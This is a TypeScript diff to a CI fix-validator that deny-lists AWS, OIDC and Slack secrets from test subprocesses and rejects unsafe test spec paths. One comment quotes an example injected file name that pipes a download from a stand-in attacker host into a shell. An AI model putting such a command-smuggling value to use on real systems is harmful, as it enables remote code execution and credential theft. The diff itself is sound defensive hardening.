@@ -45,6 +45,27 @@ const SECRET_ENV_KEYS = new Set([
   'INPUT_CURSOR_API_KEY',
   'INPUT_NPM_TOKEN',
   'INPUT_CROSS_REPO_PAT',
+  // AWS credentials — added per code_review_may_2026 Security #2.
+  // When the agent uses OIDC to assume a role for DynamoDB skill-store
+  // access, these env vars are populated on the runner and would
+  // otherwise pass through to the test subprocess. LLM-generated fixes
+  // or compromised dependencies executed inside the test could read and
+  // exfiltrate them. Deny-listing here is independent of the OIDC
+  // session lifetime — the parent action keeps its own env intact and
+  // can still reach DynamoDB; only the subprocess is starved.
+  'AWS_ACCESS_KEY_ID',
+  'AWS_SECRET_ACCESS_KEY',
+  'AWS_SESSION_TOKEN',
+  'AWS_DEFAULT_REGION',
+  'AWS_REGION',
+  // OIDC-related vars that, while not credentials, can be used to
+  // request fresh tokens for additional roles via STS — same risk class.
+  'ACTIONS_ID_TOKEN_REQUEST_TOKEN',
+  'ACTIONS_ID_TOKEN_REQUEST_URL',
+  // Slack webhook URL (used elsewhere in the org) — preempt accidental
+  // forwarding when consumer workflows expose it as an action env.
+  'SLACK_WEBHOOK_URL',
+  'INPUT_SLACK_WEBHOOK_URL',
 ]);
 
 function filterEnv(npmToken?: string): Record<string, string> {
@@ -391,6 +412,57 @@ export class LocalFixValidator {
   async runTest(): Promise<TestRunResult> {
     if (!this.config.testCommand) {
       throw new Error('No testCommand configured — cannot run validation');
+    }
+
+    // Shell-injection defense (code_review_may_2026 Security #1).
+    //
+    // `this.config.spec` can be sourced from `errorData.fileName`, which is
+    // extracted from CI logs via a permissive regex (`[^\s]+\.[jt]sx?`).
+    // That regex matches any sequence of non-whitespace characters ending
+    // in a JS/TS extension — including shell metacharacters such as `;`,
+    // `|`, `&`, `$()`, and backticks. Without validation, a malicious test
+    // log of the form `spec: a.ts;curl evil.com|sh;b.ts` would propagate
+    // through `cmd.replaceAll('{spec}', spec)` and into `execSync(cmd)`,
+    // which spawns a shell and would interpret the metacharacters.
+    //
+    // Defenses applied here:
+    //   1. Reject specs that don't match a strict pathspec regex
+    //      (alphanumerics + `_-./` only). This rules out every shell
+    //      metacharacter, quote, and whitespace.
+    //   2. Reject specs containing `..` (path traversal).
+    //   3. Verify the spec resolves to a file that exists inside
+    //      `this._workDir` — defense in depth against absolute paths or
+    //      escapes from the cloned-repo root.
+    //
+    // If `validationSpec` is operator-provided (the common case for
+    // configured consumers), it almost always passes — these are
+    // repo-relative test paths. The defense fires when the spec falls
+    // back to log-extracted `errorData.fileName` and that string is
+    // attacker-controlled.
+    const SAFE_SPEC_REGEX = /^[a-zA-Z0-9_\-./]+$/;
+    if (this.config.spec) {
+      if (
+        !SAFE_SPEC_REGEX.test(this.config.spec) ||
+        this.config.spec.includes('..')
+      ) {
+        throw new Error(
+          `Refusing to run test: spec path "${this.config.spec}" contains characters outside the safe pathspec set [a-zA-Z0-9_\\-./] or contains ".." traversal. This is a hard-coded shell-injection defense; configure VALIDATION_SPEC explicitly with a clean repo-relative path.`
+        );
+      }
+      // Resolve against workDir and confirm the file exists. Using
+      // path.resolve + startsWith catches absolute-path escapes that the
+      // regex alone allows (e.g., `/etc/passwd` is regex-clean).
+      const resolved = path.resolve(this._workDir, this.config.spec);
+      if (!resolved.startsWith(path.resolve(this._workDir) + path.sep)) {
+        throw new Error(
+          `Refusing to run test: spec path "${this.config.spec}" resolves outside the cloned repo root.`
+        );
+      }
+      if (!fs.existsSync(resolved)) {
+        throw new Error(
+          `Refusing to run test: spec file "${this.config.spec}" does not exist in ${this._workDir}. Pass an existing repo-relative path via VALIDATION_SPEC.`
+        );
+      }
     }
 
     let cmd = this.config.testCommand;
